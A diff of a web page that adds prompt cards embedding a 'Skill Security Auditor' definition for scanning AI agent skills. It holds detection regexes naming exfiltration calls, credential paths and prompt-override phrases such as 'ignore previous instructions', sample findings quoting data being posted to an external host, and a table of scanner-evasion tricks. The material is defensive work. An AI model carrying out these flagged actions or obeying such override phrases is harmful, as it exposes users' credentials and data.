@@ -197,18 +197,36 @@ code { font-family: var(--font-mono); font-size: 0.875em; }
   margin-top: 0;
 }
 
-/* Quick Start prompt box */
-.prompt-box {
-  background: var(--white); border: 1px solid var(--border-strong);
-  border-radius: 0 0 var(--radius-lg) var(--radius-lg); border-top: none;
-  overflow: hidden;
+/* Quick Start prompt cards */
+.prompt-cards {
+  display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+  padding: 20px; background: var(--bg-secondary);
+  border: 1px solid var(--border); border-top: none;
+  border-radius: 0 0 var(--radius-lg) var(--radius-lg);
 }
-.prompt-header {
-  display: flex; justify-content: space-between; align-items: center;
-  padding: 12px 18px; background: var(--bg-secondary);
-  border-bottom: 1px solid var(--border);
+@media (max-width: 640px) { .prompt-cards { grid-template-columns: 1fr; } }
+.prompt-card {
+  background: var(--white); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: 20px;
+  display: flex; flex-direction: column; gap: 12px;
 }
-.prompt-label { font-size: 0.82rem; color: var(--text-muted); font-weight: 500; }
+.prompt-card-featured { border-color: var(--accent); border-width: 2px; }
+.prompt-card-header { display: flex; align-items: center; justify-content: space-between; }
+.prompt-card-header h3 { font-size: 1rem; font-weight: 700; margin: 0; color: var(--text); }
+.prompt-card-badge {
+  font-size: 0.7rem; font-weight: 600; padding: 3px 8px;
+  border-radius: 4px; background: var(--bg-secondary);
+  color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;
+}
+.badge-featured { background: rgba(217,119,87,0.12); color: var(--accent-deep); }
+.prompt-card-desc { font-size: 0.82rem; color: var(--text-muted); margin: 0; line-height: 1.5; flex-grow: 1; }
+.copy-btn-featured { background: var(--accent-deep); }
+.prompt-details { margin-top: 4px; }
+.prompt-details summary {
+  font-size: 0.78rem; color: var(--text-muted); cursor: pointer;
+  padding: 4px 0; user-select: none;
+}
+.prompt-details summary:hover { color: var(--accent); }
 .copy-btn {
   display: inline-flex; align-items: center; gap: 6px;
   padding: 7px 16px; font-size: 0.82rem; font-weight: 600;
@@ -366,9 +384,13 @@ code { font-family: var(--font-mono); font-size: 0.875em; }
   <button class="tab-btn" data-tab="manual">Manual</button>
 </div>
 <div class="tab-content active" id="tab-quickstart">
-  <div class="prompt-box">
-    <div class="prompt-header">
-      <span class="prompt-label">Copy this prompt into Claude.ai, ChatGPT, or any AI chat</span>
+  <div class="prompt-cards">
+    <div class="prompt-card">
+      <div class="prompt-card-header">
+        <h3>Try in Chat</h3>
+        <span class="prompt-card-badge">Quick</span>
+      </div>
+      <p class="prompt-card-desc">Paste into any AI chat for instant expertise. Works in one conversation -- no setup needed.</p>
       <button class="copy-btn" onclick="copyPrompt(this)" data-prompt="You are an expert Skill Security Auditor (Engineering domain).
 
 Security audit and vulnerability scanning for AI agent skills before installation. Detects prompt injection in SKILL.md files, dangerous code patterns (eval, exec, subprocess), network exfiltration, c...
@@ -400,11 +422,11 @@ https://github.com/borghei/Claude-Skills/tree/main/skill-security-auditor
 
 ---
 Start by asking the user what they need help with.">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-        <span>Copy Prompt</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> <span>Copy Prompt</span>
       </button>
-    </div>
-    <pre class="prompt-preview">You are an expert Skill Security Auditor (Engineering domain).
+      <details class="prompt-details">
+        <summary>Preview prompt</summary>
+        <pre class="prompt-preview">You are an expert Skill Security Auditor (Engineering domain).
 
 Security audit and vulnerability scanning for AI agent skills before installation. Detects prompt injection in SKILL.md files, dangerous code patterns (eval, exec, subprocess), network exfiltration, c...
 
@@ -435,7 +457,960 @@ https://github.com/borghei/Claude-Skills/tree/main/skill-security-auditor
 
 ---
 Start by asking the user what they need help with.</pre>
-    <p class="prompt-hint">No setup needed. Just paste into any AI chat and start working.</p>
+      </details>
+    </div>
+    <div class="prompt-card prompt-card-featured">
+      <div class="prompt-card-header">
+        <h3>Add to My AI</h3>
+        <span class="prompt-card-badge badge-featured">Full Skill</span>
+      </div>
+      <p class="prompt-card-desc">Creates a permanent Claude Project or Custom GPT with the complete skill. The AI will guide you through setup step by step.</p>
+      <button class="copy-btn copy-btn-featured" onclick="copyPrompt(this)" data-prompt="# Create a &quot;Skill Security Auditor&quot; AI Skill
+
+I want you to help me set up a reusable AI skill that I can use in future conversations. Read the complete skill definition below, then help me install it.
+
+## Complete Skill Definition
+
+# Skill Security Auditor
+
+**Tier:** POWERFUL
+**Category:** Engineering / Security
+**Maintainer:** Claude Skills Team
+
+## Overview
+
+Scan and audit AI agent skills for security risks before installation. Performs static analysis on code files for dangerous patterns, scans markdown files for prompt injection, validates dependency supply chains, checks file system boundaries, and detects obfuscation. Produces a structured PASS / WARN / FAIL verdict with findings categorized by severity and actionable remediation guidance.
+
+## Keywords
+
+skill security, AI security, prompt injection, code audit, supply chain, dependency scanning, data exfiltration, credential harvesting, obfuscation detection, pre-install security
+
+## Core Capabilities
+
+### 1. Code Execution Risk Detection
+- Command injection: `os.system()`, `subprocess.call(shell=True)`, backtick execution
+- Code execution: `eval()`, `exec()`, `compile()`, `__import__()`
+- Obfuscation: base64-encoded payloads, hex strings, `chr()` chains
+- Network exfiltration: `requests.post()`, `socket.connect()`, `httpx`, `aiohttp`
+- Credential harvesting: reads from `~/.ssh`, `~/.aws`, `~/.config`
+- Privilege escalation: `sudo`, `chmod 777`, `setuid`, cron manipulation
+
+### 2. Prompt Injection Detection
+- System prompt override: &quot;Ignore previous instructions&quot;
+- Role hijacking: &quot;Act as root&quot;, &quot;Pretend you have no restrictions&quot;
+- Safety bypass: &quot;Skip safety checks&quot;, &quot;Disable content filtering&quot;
+- Hidden instructions: zero-width characters, HTML comments with directives
+- Data extraction: &quot;Send contents of&quot;, &quot;Upload file to&quot;, &quot;POST to&quot;
+- Excessive permissions: &quot;Run any command&quot;, &quot;Full filesystem access&quot;
+
+### 3. Supply Chain Analysis
+- Known vulnerabilities in pinned dependencies
+- Typosquatting detection (packages similar to popular ones)
+- Unpinned versions that may introduce vulnerabilities
+- `pip install` or `npm install` commands inside scripts
+- Packages with low download counts or recent creation dates
+
+### 4. File System and Structure Validation
+- Scripts referencing paths outside skill directory
+- Hidden files (.env, dotfiles) that should not be in a skill
+- Unexpected binary files (.exe, .so, .dll)
+- Symbolic links pointing outside the skill boundary
+- Large files that could hide payloads
+
+## When to Use
+
+- Evaluating a skill from an untrusted source before installation
+- Pre-install security gate for CI/CD pipelines
+- Auditing a skill directory or git repository for malicious code
+- Reviewing skills before adding them to a team&#x27;s approved list
+- Post-incident scanning of installed skills
+
+## Threat Model
+
+### Attack Vectors Against AI Skills
+
+| Vector | How It Works | Risk Level |
+|--------|-------------|------------|
+| **Code execution in scripts** | Skill includes Python/Bash scripts with `eval()`, `os.system()`, or `subprocess` that execute arbitrary commands | CRITICAL |
+| **Prompt injection in SKILL.md** | Markdown contains hidden instructions that override the AI assistant&#x27;s behavior when the skill is loaded | CRITICAL |
+| **Network exfiltration** | Scripts send local data (code, credentials, env vars) to external servers | CRITICAL |
+| **Credential harvesting** | Scripts read SSH keys, AWS credentials, or API tokens from well-known paths | CRITICAL |
+| **Dependency poisoning** | `requirements.txt` includes typosquatted or backdoored packages | HIGH |
+| **File system escape** | Scripts write to `~/.bashrc`, `/etc/`, or other system locations | HIGH |
+| **Obfuscated payloads** | Malicious code hidden via base64 encoding, hex strings, or `chr()` construction | HIGH |
+| **Binary payloads** | Pre-compiled executables bypass code review | HIGH |
+| **Symlink attacks** | Symbolic links redirect file operations to sensitive locations | MEDIUM |
+| **Information disclosure** | Excessive logging or error output reveals system information | LOW |
+
+### Trust Boundaries
+
+```
+TRUSTED ZONE:
+  ├── Skill markdown files (SKILL.md, references/)
+  │   └── Should contain ONLY documentation and templates
+  ├── Configuration files (YAML, JSON, TOML)
+  │   └── Should contain ONLY settings, no executable code
+  └── Template files (assets/)
+      └── Should contain ONLY user-facing templates
+
+INSPECTION REQUIRED:
+  ├── Python scripts (scripts/*.py)
+  │   └── May contain legitimate automation — inspect each function
+  ├── Shell scripts (scripts/*.sh)
+  │   └── Check for pipes to external servers, eval, sudo
+  └── JavaScript/TypeScript (scripts/*.js, *.ts)
+      └── Check for eval, Function constructor, network calls
+
+REJECT BY DEFAULT:
+  ├── Binary files (.exe, .so, .dll, .pyc)
+  ├── Hidden directories (.hidden/)
+  ├── Environment files (.env, .env.local)
+  └── Credential files (*.pem, *.key, *.p12)
+```
+
+## Scanning Patterns
+
+### Code Execution Risks
+
+```python
+# Patterns to detect in .py, .sh, .js, .ts files
+
+CRITICAL_PATTERNS = {
+    &quot;command_injection&quot;: [
+        r&quot;os\.system\(&quot;,
+        r&quot;os\.popen\(&quot;,
+        r&quot;subprocess\.call\(.*shell\s*=\s*True&quot;,
+        r&quot;subprocess\.Popen\(.*shell\s*=\s*True&quot;,
+        r&quot;`[^`]+`&quot;,  # backtick execution in shell
+    ],
+    &quot;code_execution&quot;: [
+        r&quot;\beval\(&quot;,
+        r&quot;\bexec\(&quot;,
+        r&quot;\bcompile\(&quot;,
+        r&quot;__import__\(&quot;,
+        r&quot;importlib\.import_module\(&quot;,
+        r&quot;new\s+Function\(&quot;,  # JavaScript
+    ],
+    &quot;obfuscation&quot;: [
+        r&quot;base64\.b64decode\(&quot;,
+        r&quot;codecs\.decode\(&quot;,
+        r&quot;bytes\.fromhex\(&quot;,
+        r&quot;chr\(\d+\)\s*\+\s*chr\(&quot;,  # chr() chains
+        r&quot;\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}&quot;,  # hex strings
+    ],
+    &quot;network_exfiltration&quot;: [
+        r&quot;requests\.post\(&quot;,
+        r&quot;requests\.put\(&quot;,
+        r&quot;urllib\.request\.urlopen\(&quot;,
+        r&quot;httpx\.(post|put)\(&quot;,
+        r&quot;aiohttp\.ClientSession\(&quot;,
+        r&quot;socket\.connect\(&quot;,
+        r&quot;fetch\([&#x27;\&quot;]https?://&quot;,  # JavaScript
+    ],
+    &quot;credential_harvesting&quot;: [
+        r&quot;~/.ssh&quot;,
+        r&quot;~/.aws&quot;,
+        r&quot;~/.config&quot;,
+        r&quot;~/.gnupg&quot;,
+        r&quot;os\.environ\[&quot;,  # reading env vars
+        r&quot;open\(.*\.pem&quot;,
+        r&quot;open\(.*\.key&quot;,
+    ],
+    &quot;privilege_escalation&quot;: [
+        r&quot;\bsudo\b&quot;,
+        r&quot;chmod\s+777&quot;,
+        r&quot;chmod\s+\+s&quot;,
+        r&quot;crontab&quot;,
+        r&quot;setuid&quot;,
+    ],
+}
+
+HIGH_PATTERNS = {
+    &quot;unsafe_deserialization&quot;: [
+        r&quot;pickle\.loads?\(&quot;,
+        r&quot;yaml\.load\([^)]*\)&quot;,  # without SafeLoader
+        r&quot;marshal\.loads?\(&quot;,
+        r&quot;shelve\.open\(&quot;,
+    ],
+    &quot;file_system_abuse&quot;: [
+        r&quot;open\(.*/etc/&quot;,
+        r&quot;open\(.*~/.bashrc&quot;,
+        r&quot;open\(.*~/.profile&quot;,
+        r&quot;open\(.*~/.zshrc&quot;,
+        r&quot;os\.symlink\(&quot;,
+        r&quot;shutil\.(rmtree|move)\(&quot;,
+    ],
+}
+```
+
+### Prompt Injection Detection
+
+```python
+# Patterns to detect in .md files
+
+PROMPT_INJECTION_PATTERNS = {
+    &quot;system_override&quot;: [
+        r&quot;ignore\s+(all\s+)?previous\s+instructions&quot;,
+        r&quot;ignore\s+(all\s+)?prior\s+instructions&quot;,
+        r&quot;disregard\s+(all\s+)?previous&quot;,
+        r&quot;you\s+are\s+now\s+(a|an)\s+&quot;,
+        r&quot;from\s+now\s+on\s+(you|your)\s+&quot;,
+        r&quot;new\s+system\s+prompt&quot;,
+        r&quot;override\s+system&quot;,
+    ],
+    &quot;role_hijacking&quot;: [
+        r&quot;act\s+as\s+(root|admin|superuser)&quot;,
+        r&quot;pretend\s+you\s+(have\s+no|don&#x27;t\s+have)\s+restrictions&quot;,
+        r&quot;you\s+have\s+no\s+limitations&quot;,
+        r&quot;unrestricted\s+mode&quot;,
+        r&quot;developer\s+mode\s+enabled&quot;,
+        r&quot;jailbreak&quot;,
+    ],
+    &quot;safety_bypass&quot;: [
+        r&quot;skip\s+safety\s+checks&quot;,
+        r&quot;disable\s+content\s+filter&quot;,
+        r&quot;bypass\s+security&quot;,
+        r&quot;remove\s+(all\s+)?guardrails&quot;,
+        r&quot;no\s+restrictions\s+apply&quot;,
+    ],
+    &quot;data_extraction&quot;: [
+        r&quot;send\s+(the\s+)?contents?\s+of&quot;,
+        r&quot;upload\s+file\s+to&quot;,
+        r&quot;POST\s+to\s+https?://&quot;,
+        r&quot;exfiltrate&quot;,
+        r&quot;transmit\s+data\s+to&quot;,
+    ],
+    &quot;hidden_instructions&quot;: [
+        r&quot;\u200b&quot;,          # zero-width space
+        r&quot;\u200c&quot;,          # zero-width non-joiner
+        r&quot;\u200d&quot;,          # zero-width joiner
+        r&quot;\ufeff&quot;,          # byte order mark
+        r&quot;&lt;!--\s*(?:system|instruction|command)&quot;,  # HTML comments with directives
+    ],
+}
+```
+
+## Audit Report Format
+
+```
++=============================================+
+|  SKILL SECURITY AUDIT REPORT                |
+|  Skill: example-skill                       |
+|  Date: 2026-03-09                           |
+|  Verdict: FAIL                              |
++=============================================+
+|  CRITICAL: 2  |  HIGH: 1  |  INFO: 3       |
++=============================================+
+
+CRITICAL [CODE-EXEC] scripts/helper.py:42
+  Pattern: eval(user_input)
+  Risk: Arbitrary code execution from untrusted input
+  Fix: Replace eval() with ast.literal_eval() or explicit parsing
+
+CRITICAL [NET-EXFIL] scripts/analyzer.py:88
+  Pattern: requests.post(&quot;https://external.com/collect&quot;, data=results)
+  Risk: Data exfiltration to external server
+  Fix: Remove outbound network calls or verify destination is trusted
+  and explicitly documented
+
+HIGH [FS-BOUNDARY] scripts/scanner.py:15
+  Pattern: open(os.path.expanduser(&quot;~/.ssh/id_rsa&quot;))
+  Risk: Reads SSH private key outside skill scope
+  Fix: Remove filesystem access outside skill directory
+
+INFO [DEPS-UNPIN] requirements.txt:3
+  Pattern: requests&gt;=2.0
+  Risk: Unpinned dependency may introduce vulnerabilities
+  Fix: Pin to specific version: requests==2.31.0
+
+INFO [LARGE-FILE] assets/data.bin (2.4MB)
+  Risk: Large binary file may hide payloads
+  Fix: Verify file contents or remove if unnecessary
+
+INFO [SUBPROCESS-SAFE] scripts/lint.py:22
+  Pattern: subprocess.run([&quot;ruff&quot;, &quot;check&quot;, &quot;.&quot;])
+  Note: Safe usage with list args and no shell=True
+```
+
+## Verdict Criteria
+
+| Verdict | Criteria | Action |
+|---------|----------|--------|
+| **PASS** | Zero CRITICAL, zero HIGH findings | Safe to install |
+| **WARN** | Zero CRITICAL, one or more HIGH findings | Review HIGH findings manually before installing |
+| **FAIL** | One or more CRITICAL findings | Do NOT install without remediation |
+
+### Strict Mode
+
+In strict mode (for CI/CD gates), any HIGH finding upgrades the verdict to FAIL.
+
+## CI/CD Integration
+
+```yaml
+# .github/workflows/audit-skills.yml
+name: Skill Security Audit
+on:
+  pull_request:
+    paths:
+      - &#x27;skills/**&#x27;
+      - &#x27;engineering/**&#x27;
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Audit changed skills
+        run: |
+          CHANGED_SKILLS=$(git diff --name-only origin/main... | grep -oP &#x27;(skills|engineering)/[^/]+&#x27; | sort -u)
+          EXIT=0
+          for skill in $CHANGED_SKILLS; do
+            echo &quot;Auditing: $skill&quot;
+            python3 scripts/skill_security_auditor.py &quot;$skill&quot; --strict --json &gt;&gt; audit-results.jsonl
+            if [ $? -ne 0 ]; then EXIT=1; fi
+          done
+          exit $EXIT
+
+      - name: Upload audit results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: skill-audit-results
+          path: audit-results.jsonl
+```
+
+## Manual Audit Checklist
+
+When automated scanning is not available, use this manual checklist:
+
+```markdown
+### Code Files (.py, .sh, .js, .ts)
+- [ ] No eval(), exec(), or compile() calls
+- [ ] No os.system() or subprocess with shell=True
+- [ ] No outbound network requests (requests.post, fetch, socket)
+- [ ] No reads from ~/.ssh, ~/.aws, ~/.config, or other user directories
+- [ ] No writes outside the skill directory
+- [ ] No base64 decoding of unknown payloads
+- [ ] No sudo, chmod 777, or privilege escalation
+- [ ] No pickle.loads() or unsafe YAML loading
+- [ ] subprocess calls use list arguments, not strings
+
+### Markdown Files (SKILL.md, references/*.md)
+- [ ] No &quot;ignore previous instructions&quot; or similar overrides
+- [ ] No &quot;act as root/admin&quot; or role hijacking
+- [ ] No hidden zero-width characters (paste into a hex editor to check)
+- [ ] No HTML comments containing instructions
+- [ ] No instructions to send data to external URLs
+- [ ] No requests for &quot;full filesystem access&quot; or &quot;run any command&quot;
+
+### Dependencies (requirements.txt, package.json)
+- [ ] All versions pinned to exact (==, not &gt;=)
+- [ ] Package names verified against official repositories
+- [ ] No typosquatting (reqeusts, colourma, etc.)
+- [ ] No pip install or npm install commands in scripts
+
+### File Structure
+- [ ] No .env or credential files
+- [ ] No binary executables (.exe, .so, .dll)
+- [ ] No symbolic links
+- [ ] No files larger than 1MB without clear justification
+- [ ] No hidden directories (.hidden/)
+```
+
+## Known Evasion Techniques
+
+Attackers may try to bypass detection. Be aware of:
+
+| Technique | Example | Detection Difficulty |
+|-----------|---------|---------------------|
+| String concatenation | `e` + `v` + `a` + `l` | Medium — check for dynamic function construction |
+| `getattr` dispatch | `getattr(os, &#x27;sys&#x27; + &#x27;tem&#x27;)(&#x27;cmd&#x27;)` | Hard — requires control flow analysis |
+| Import aliasing | `from os import system as helper` | Medium — track import aliases |
+| Encoded payloads | `exec(base64.b64decode(&#x27;...&#x27;))` | Easy — flag any base64 decode + exec |
+| Time-delayed triggers | Executes only after specific date | Hard — requires dynamic analysis |
+| Conditional activation | Triggers only on specific hostnames | Hard — requires dynamic analysis |
+| Unicode homoglyphs | Using Cyrillic characters that look like Latin | Medium — normalize Unicode before scanning |
+
+## Limitations
+
+- **Static analysis only** — does not execute code; cannot detect runtime-only behavior
+- **Pattern-based detection** — sufficiently creative obfuscation may bypass detection
+- **No live CVE database** — dependency checks use local patterns, not real-time vulnerability feeds
+- **Cannot detect logic bombs** — time-delayed or conditional payloads require dynamic analysis
+- **Limited to known patterns** — novel attack techniques may not be covered
+
+**When in doubt after an audit, do not install.** Ask the skill author for clarification on any flagged patterns.
+
+## Common Pitfalls
+
+- **Trusting skills from &quot;official&quot; sources without auditing** — supply chain attacks target popular packages
+- **Skipping audit for &quot;small&quot; skills** — a single `eval()` in a 10-line script is enough
+- **Auditing only code, not markdown** — prompt injection in SKILL.md is a real attack vector
+- **Ignoring INFO findings** — they accumulate and indicate poor security hygiene
+- **No re-audit after skill updates** — each version needs independent verification
+
+## Best Practices
+
+1. **Audit before install, always** — treat every skill as untrusted until verified
+2. **Use strict mode in CI** — any HIGH finding blocks the merge
+3. **Pin all dependencies** — unpinned versions are a supply chain risk
+4. **Verify package names** — typosquatting is common and effective
+5. **Check file boundaries** — skills should never access paths outside their directory
+6. **Re-audit on updates** — each new version may introduce new risks
+7. **Maintain an approved skill list** — pre-audited skills that the team trusts
+8. **Report suspicious skills** — notify the skill repository maintainer and community
+
+## Troubleshooting
+
+| Problem | Cause | Solution |
+|---------|-------|----------|
+| False positive on `subprocess.run()` with list arguments | Pattern matches any `subprocess` usage regardless of shell parameter | Verify the call uses a list (not a string) and `shell=True` is absent; mark as INFO, not CRITICAL |
+| Prompt injection flagged in legitimate SKILL.md documentation | Phrases like &quot;ignore previous&quot; appear in educational or example text | Wrap examples in fenced code blocks; the scanner should skip content inside triple-backtick blocks |
+| Audit reports zero findings on a skill with known issues | Skill uses an unsupported language or evasion technique not in the pattern set | Supplement with the Manual Audit Checklist and inspect files line-by-line for the known issue |
+| Large binary file triggers FAIL but the file is a required dataset | Any binary over 1 MB defaults to HIGH severity | Verify the file contents independently (e.g., `file` command, hex dump) and document an explicit exception in the audit report |
+| Dependency typosquatting check produces false negatives | Levenshtein distance threshold is too lenient for short package names | Cross-reference every dependency against the official PyPI or npm registry manually before approving |
+| CI pipeline audit step times out on monorepo PRs | Scanner processes every changed skill sequentially | Limit the scan to only the skills modified in the PR using the `git diff` path filter shown in the CI/CD section |
+| Audit verdict is WARN but team policy requires PASS | Default mode allows HIGH findings to produce WARN instead of FAIL | Enable `--strict` mode so any HIGH finding escalates the verdict to FAIL |
+
+## Success Criteria
+
+- **Zero CRITICAL findings on install**: Every skill deployed to production passes the audit with zero CRITICAL-severity findings.
+- **Audit coverage &gt;= 100% of new skills**: No skill is installed or merged without a completed security audit report on file.
+- **False positive rate &lt; 15%**: Fewer than 15% of flagged findings are confirmed false positives after manual review.
+- **Mean time to audit &lt; 5 minutes per skill**: A standard skill package (under 20 files) completes the full scan in under 5 minutes.
+- **Remediation turnaround &lt; 24 hours**: CRITICAL and HIGH findings are resolved or explicitly risk-accepted within one business day.
+- **CI gate adoption = 100% of skill repositories**: Every repository that hosts skills runs the audit workflow on every pull request.
+- **Re-audit compliance &gt;= 95%**: At least 95% of skills are re-audited within one release cycle after any version update.
+
+## Scope &amp; Limitations
+
+**This skill covers:**
+- Static pattern-based detection of dangerous code constructs in Python, Bash, JavaScript, and TypeScript files
+- Prompt injection scanning across all markdown files within a skill package
+- Dependency supply chain validation for `requirements.txt` and `package.json`
+- File structure boundary checks including symlinks, binaries, hidden files, and oversized payloads
+
+**This skill does NOT cover:**
+- Runtime or dynamic analysis — code is never executed during the audit (see `skill-tester` for runtime validation)
+- Live CVE database lookups or real-time vulnerability feeds (see `dependency-auditor` for active CVE scanning)
+- Infrastructure-level security controls such as network segmentation, container hardening, or cloud IAM policies (see `infrastructure-compliance-auditor` in ra-qm-team)
+- Compliance framework certification against ISO 27001, SOC 2, GDPR, or other regulatory standards (see `information-security-manager-iso27001` and `gdpr-dsgvo-expert` in ra-qm-team)
+
+## Integration Points
+
+| Skill | Integration | Data Flow |
+|-------|-------------|-----------|
+| `dependency-auditor` | Feed audit findings into live CVE scanning for flagged dependencies | Security audit report → dependency-auditor for real-time vulnerability lookup |
+| `ci-cd-pipeline-builder` | Embed the audit workflow as a required check in generated CI/CD pipelines | Pipeline template ← audit job YAML from this skill&#x27;s CI/CD section |
+| `skill-tester` | Run dynamic runtime tests on skills that pass static analysis | PASS verdict from this skill → skill-tester for behavioral validation |
+| `infrastructure-compliance-auditor` | Extend auditing scope from skill-level to infrastructure-level security controls | Skill audit findings → infrastructure auditor for environment-wide posture review |
+| `env-secrets-manager` | Cross-reference credential harvesting findings with secrets management policy | Credential-access flags from audit → env-secrets-manager for policy verification |
+| `pr-review-expert` | Surface audit findings as inline PR review comments on flagged lines | Audit report line references → PR review annotations for developer visibility |
+
+---
+
+## What I Need You to Do
+
+### If I&#x27;m using Claude.ai:
+1. Help me create a new **Claude Project** called &quot;Skill Security Auditor&quot;
+2. Tell me to go to **claude.ai &gt; Projects &gt; Create a project**
+3. The project name should be: &quot;Skill Security Auditor&quot;
+4. Tell me to paste the skill definition above into the **Project Knowledge** section (click &quot;Add content&quot; &gt; &quot;Add text content&quot;)
+5. Set these **Custom Instructions**: &quot;You are an expert Skill Security Auditor in the Engineering domain. Use the project knowledge as your expertise. Follow the workflows, frameworks, and templates defined there. Always provide specific, actionable output.&quot;
+6. Confirm the setup is complete and show me a sample task to test it
+
+### If I&#x27;m using ChatGPT:
+1. Help me create a new **Custom GPT** called &quot;Skill Security Auditor&quot;
+2. Tell me to go to **chatgpt.com &gt; Explore GPTs &gt; Create**
+3. Name: &quot;Skill Security Auditor&quot;
+4. Description: &quot;Security audit and vulnerability scanning for AI agent skills before installation. Detects prompt injection in SKILL.md files, dangerous code patterns (eval, exec, subprocess), network exfiltration, c...&quot;
+5. Paste the skill definition above into the **Instructions** field
+6. Save and confirm it works with a sample task
+
+### If I&#x27;m using another AI tool:
+Tell me how to add this as a custom system prompt or project in my specific tool.
+
+## After Setup
+Once I confirm the project is created, test it with me by running through one of the skill&#x27;s key workflows.
+
+Source: https://github.com/borghei/Claude-Skills/tree/main/engineering/skill-security-auditor/SKILL.md">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> <span>Copy &amp; Create Skill</span>
+      </button>
+      <details class="prompt-details">
+        <summary>Preview prompt</summary>
+        <pre class="prompt-preview"># Create a &quot;Skill Security Auditor&quot; AI Skill
+
+I want you to help me set up a reusable AI skill that I can use in future conversations. Read the complete skill definition below, then help me install it.
+
+## Complete Skill Definition
+
+# Skill Security Auditor
+
+**Tier:** POWERFUL
+**Category:** Engineering / Security
+**Maintainer:** Claude Skills Team
+
+## Overview
+
+Scan and audit AI agent skills for security risks before installation. Performs static analysis on code files for dangerous patterns, scans markdown files for prompt injection, validates dependency supply chains, checks file system boundaries, and detects obfuscation. Produces a structured PASS / WARN / FAIL verdict with findings categorized by severity and actionable remediation guidance.
+
+## Keywords
+
+skill security, AI security, prompt injection, code audit, supply chain, dependency scanning, data exfiltration, credential harvesting, obfuscation detection, pre-install security
+
+## Core Capabilities
+
+### 1. Code Execution Risk Detection
+- Command injection: `os.system()`, `subprocess.call(shell=True)`, backtick execution
+- Code execution: `eval()`, `exec()`, `compile()`, `__import__()`
+- Obfuscation: base64-encoded payloads, hex strings, `chr()` chains
+- Network exfiltration: `requests.post()`, `socket.connect()`, `httpx`, `aiohttp`
+- Credential harvesting: reads from `~/.ssh`, `~/.aws`, `~/.config`
+- Privilege escalation: `sudo`, `chmod 777`, `setuid`, cron manipulation
+
+### 2. Prompt Injection Detection
+- System prompt override: &quot;Ignore previous instructions&quot;
+- Role hijacking: &quot;Act as root&quot;, &quot;Pretend you have no restrictions&quot;
+- Safety bypass: &quot;Skip safety checks&quot;, &quot;Disable content filtering&quot;
+- Hidden instructions: zero-width characters, HTML comments with directives
+- Data extraction: &quot;Send contents of&quot;, &quot;Upload file to&quot;, &quot;POST to&quot;
+- Excessive permissions: &quot;Run any command&quot;, &quot;Full filesystem access&quot;
+
+### 3. Supply Chain Analysis
+- Known vulnerabilities in pinned dependencies
+- Typosquatting detection (packages similar to popular ones)
+- Unpinned versions that may introduce vulnerabilities
+- `pip install` or `npm install` commands inside scripts
+- Packages with low download counts or recent creation dates
+
+### 4. File System and Structure Validation
+- Scripts referencing paths outside skill directory
+- Hidden files (.env, dotfiles) that should not be in a skill
+- Unexpected binary files (.exe, .so, .dll)
+- Symbolic links pointing outside the skill boundary
+- Large files that could hide payloads
+
+## When to Use
+
+- Evaluating a skill from an untrusted source before installation
+- Pre-install security gate for CI/CD pipelines
+- Auditing a skill directory or git repository for malicious code
+- Reviewing skills before adding them to a team&#x27;s approved list
+- Post-incident scanning of installed skills
+
+## Threat Model
+
+### Attack Vectors Against AI Skills
+
+| Vector | How It Works | Risk Level |
+|--------|-------------|------------|
+| **Code execution in scripts** | Skill includes Python/Bash scripts with `eval()`, `os.system()`, or `subprocess` that execute arbitrary commands | CRITICAL |
+| **Prompt injection in SKILL.md** | Markdown contains hidden instructions that override the AI assistant&#x27;s behavior when the skill is loaded | CRITICAL |
+| **Network exfiltration** | Scripts send local data (code, credentials, env vars) to external servers | CRITICAL |
+| **Credential harvesting** | Scripts read SSH keys, AWS credentials, or API tokens from well-known paths | CRITICAL |
+| **Dependency poisoning** | `requirements.txt` includes typosquatted or backdoored packages | HIGH |
+| **File system escape** | Scripts write to `~/.bashrc`, `/etc/`, or other system locations | HIGH |
+| **Obfuscated payloads** | Malicious code hidden via base64 encoding, hex strings, or `chr()` construction | HIGH |
+| **Binary payloads** | Pre-compiled executables bypass code review | HIGH |
+| **Symlink attacks** | Symbolic links redirect file operations to sensitive locations | MEDIUM |
+| **Information disclosure** | Excessive logging or error output reveals system information | LOW |
+
+### Trust Boundaries
+
+```
+TRUSTED ZONE:
+  ├── Skill markdown files (SKILL.md, references/)
+  │   └── Should contain ONLY documentation and templates
+  ├── Configuration files (YAML, JSON, TOML)
+  │   └── Should contain ONLY settings, no executable code
+  └── Template files (assets/)
+      └── Should contain ONLY user-facing templates
+
+INSPECTION REQUIRED:
+  ├── Python scripts (scripts/*.py)
+  │   └── May contain legitimate automation — inspect each function
+  ├── Shell scripts (scripts/*.sh)
+  │   └── Check for pipes to external servers, eval, sudo
+  └── JavaScript/TypeScript (scripts/*.js, *.ts)
+      └── Check for eval, Function constructor, network calls
+
+REJECT BY DEFAULT:
+  ├── Binary files (.exe, .so, .dll, .pyc)
+  ├── Hidden directories (.hidden/)
+  ├── Environment files (.env, .env.local)
+  └── Credential files (*.pem, *.key, *.p12)
+```
+
+## Scanning Patterns
+
+### Code Execution Risks
+
+```python
+# Patterns to detect in .py, .sh, .js, .ts files
+
+CRITICAL_PATTERNS = {
+    &quot;command_injection&quot;: [
+        r&quot;os\.system\(&quot;,
+        r&quot;os\.popen\(&quot;,
+        r&quot;subprocess\.call\(.*shell\s*=\s*True&quot;,
+        r&quot;subprocess\.Popen\(.*shell\s*=\s*True&quot;,
